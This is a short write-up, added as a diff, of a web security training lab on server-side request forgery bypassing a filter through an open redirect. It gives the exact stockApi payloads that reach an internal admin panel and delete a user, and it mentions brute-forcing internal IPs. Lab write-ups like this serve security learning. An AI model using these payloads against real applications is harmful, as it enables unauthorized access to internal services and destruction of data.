@@ -1,0 +1,29 @@
+LAB INFO: SSRF with filter bypass via open redirection vulnerability
+
+MORE INFO:  This lab has a stock check feature which fetches data from an internal system.
+
+To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.
+
+The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.
+ 
+
+
+Vulnerable Feature: Stock Check feature
+
+Goal: Change the stock check url to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.
+
+
+Analysis: 
+1. We are going to surfing the page and find the stock check feature.
+2. There we can see the nextProduct button by clicking there we got this api: /product/nextProduct?currentProductId=1&path=/product?productId=2
+3. So, by looking at this api we may assume that we can now change the path to access the admin interface.
+4. At the product/stock path we do:
+  stockApi =/product/nextProduct?path=http://some_IP:8080/
+  *** The ip we know as: 192.168.0.12 but I bruteforce it from the intruder tool to find the correct ip.
+  *** At every ip it shows the 500 internal server error but at the 192.168.0.12 ip it shows the 404 page not found
+5. So trying to accessing the admin page there we successfully found the admin panel
+*** stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin ==> This successfully shows me a admin panel
+6. Now we can delete the user carlos by this request:
+*** stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+HENCE WE SOLVED THE LAB
